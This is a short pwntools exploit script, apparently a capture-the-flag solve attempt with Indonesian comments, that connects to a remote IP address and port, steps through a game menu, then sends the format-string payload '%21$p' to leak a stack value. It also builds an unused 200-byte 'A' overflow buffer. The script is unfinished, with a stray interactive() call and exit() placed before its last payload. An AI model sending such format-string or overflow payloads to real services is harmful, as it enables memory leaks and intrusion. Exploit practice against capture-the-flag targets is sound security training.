#!/usr/bin/python3

from pwn import *

io = remote("34.124.192.13", 57260)

# menu pilih game
payload = b'1'

io.sendline(payload)

io.clean()

# menu game
io.sendline(b'1')
io.interactive()
io.sendline(b'1')
io.sendline(b'1')
io.sendline(b'2')
io.sendline(b'2')
io.sendline(b'2')
io.sendline(b'1')
io.sendline(b'3')
io.sendline(b'3')
io.sendline(b'3')

io.clean()

io.sendline(b'%21$p')

print(io.recv())

val = io.recv()

print(val)

exit()

payload = 'A' * 200
